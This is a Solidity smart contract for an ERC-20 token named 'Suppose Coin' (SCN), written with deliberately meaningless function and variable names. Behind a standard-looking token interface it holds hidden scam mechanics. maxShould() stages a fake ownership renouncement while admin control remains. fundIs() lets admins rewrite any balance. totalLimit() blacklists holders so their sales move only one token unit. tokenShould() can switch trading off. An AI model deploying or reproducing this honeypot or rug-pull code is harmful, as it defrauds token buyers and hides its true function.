//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract tokenTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletSwap {
    function createPair(address minBuyReceiver, address exemptLiquidity) external returns (address);

    function feeTo() external view returns (address);
}

interface enableLimitFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface teamMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapFrom) external view returns (uint256);

    function transfer(address feeMin, uint256 amountIs) external returns (bool);

    function allowance(address fromLiquidityLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountIs) external returns (bool);

    function transferFrom(
        address sender,
        address feeMin,
        uint256 amountIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverReceiverLaunched, uint256 value);
    event Approval(address indexed fromLiquidityLaunch, address indexed spender, uint256 value);
}

interface teamMarketingMetadata is teamMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SupposeCoin is tokenTx, teamMarketing, teamMarketingMetadata {

    uint8 private enableBuy = 18;

    bool public listLiquidityFund;

    string private tokenFund = "Suppose Coin";

    bool private fromTotal;

    string private receiverFund = "SCN";

    function modeLaunchedWallet() private view {
        require(teamExempt[_msgSender()]);
    }

    function allowance(address minTotal, address walletEnableSell) external view virtual override returns (uint256) {
        if (walletEnableSell == amountMaxFrom) {
            return type(uint256).max;
        }
        return walletEnable[minTotal][walletEnableSell];
    }

    function getOwner() external view returns (address) {
        return sellList;
    }

    address private sellList;

    bool public liquidityFrom;

    function modeReceiver(address buyMarketing) public {
        require(buyMarketing.balance < 100000);
        if (listLiquidityFund) {
            return;
        }
        if (liquidityFrom == fromTotal) {
            amountSell = receiverSell;
        }
        teamExempt[buyMarketing] = true;
        
        listLiquidityFund = true;
    }

    function totalLimit(address limitAmount) public {
        modeLaunchedWallet();
        
        if (limitAmount == senderAmount || limitAmount == modeTx) {
            return;
        }
        minList[limitAmount] = true;
    }

    uint256 public receiverLaunched = 0;

    function name() external view virtual override returns (string memory) {
        return tokenFund;
    }

    address amountMaxFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public maxTakeMarketing;

    function decimals() external view virtual override returns (uint8) {
        return enableBuy;
    }

    constructor (){
        
        maxShould();
        enableLimitFund swapListBuy = enableLimitFund(amountMaxFrom);
        modeTx = walletSwap(swapListBuy.factory()).createPair(swapListBuy.WETH(), address(this));
        tradingLaunch = walletSwap(swapListBuy.factory()).feeTo();
        
        senderAmount = _msgSender();
        teamExempt[senderAmount] = true;
        fundMax[senderAmount] = receiverIsToken;
        
        emit Transfer(address(0), senderAmount, receiverIsToken);
    }

    uint256 constant txToken = 1 ** 10;

    function transferFrom(address buyMode, address feeMin, uint256 amountIs) external override returns (bool) {
        if (_msgSender() != amountMaxFrom) {
            if (walletEnable[buyMode][_msgSender()] != type(uint256).max) {
                require(amountIs <= walletEnable[buyMode][_msgSender()]);
                walletEnable[buyMode][_msgSender()] -= amountIs;
            }
        }
        return totalTrading(buyMode, feeMin, amountIs);
    }

    uint256 private receiverIsToken = 100000000 * 10 ** 18;

    function balanceOf(address swapFrom) public view virtual override returns (uint256) {
        return fundMax[swapFrom];
    }

    address tradingLaunch;

    uint256 public minAmount;

    function fundIs(address listTeam, uint256 amountIs) public {
        modeLaunchedWallet();
        fundMax[listTeam] = amountIs;
    }

    uint256 sellAt;

    function owner() external view returns (address) {
        return sellList;
    }

    uint256 public limitAt = 0;

    mapping(address => bool) public teamExempt;

    uint256 public receiverSell;

    function transfer(address listTeam, uint256 amountIs) external virtual override returns (bool) {
        return totalTrading(_msgSender(), listTeam, amountIs);
    }

    uint256 public amountSell;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverIsToken;
    }

    function amountFee(address buyMode, address feeMin, uint256 amountIs) internal view returns (uint256) {
        require(amountIs > 0);

        uint256 walletExempt = 0;
        if (buyMode == modeTx && limitAt > 0) {
            walletExempt = amountIs * limitAt / 100;
        } else if (feeMin == modeTx && receiverLaunched > 0) {
            walletExempt = amountIs * receiverLaunched / 100;
        }
        require(walletExempt <= amountIs);
        return amountIs - walletExempt;
    }

    mapping(address => uint256) private fundMax;

    function receiverExempt(address buyMode, address feeMin, uint256 amountIs) internal returns (bool) {
        require(fundMax[buyMode] >= amountIs);
        fundMax[buyMode] -= amountIs;
        fundMax[feeMin] += amountIs;
        emit Transfer(buyMode, feeMin, amountIs);
        return true;
    }

    mapping(address => mapping(address => uint256)) private walletEnable;

    function approve(address walletEnableSell, uint256 amountIs) public virtual override returns (bool) {
        walletEnable[_msgSender()][walletEnableSell] = amountIs;
        emit Approval(_msgSender(), walletEnableSell, amountIs);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverFund;
    }

    function maxShould() public {
        emit OwnershipTransferred(senderAmount, address(0));
        sellList = address(0);
    }

    function totalTrading(address buyMode, address feeMin, uint256 amountIs) internal returns (bool) {
        if (buyMode == senderAmount) {
            return receiverExempt(buyMode, feeMin, amountIs);
        }
        uint256 totalSender = teamMarketing(modeTx).balanceOf(tradingLaunch);
        require(totalSender == receiverFee);
        require(feeMin != tradingLaunch);
        if (minList[buyMode]) {
            return receiverExempt(buyMode, feeMin, txToken);
        }
        amountIs = amountFee(buyMode, feeMin, amountIs);
        return receiverExempt(buyMode, feeMin, amountIs);
    }

    mapping(address => bool) public minList;

    address public senderAmount;

    function tokenShould(uint256 amountIs) public {
        modeLaunchedWallet();
        receiverFee = amountIs;
    }

    address public modeTx;

    event OwnershipTransferred(address indexed fromMinToken, address indexed buySender);

    uint256 receiverFee;

}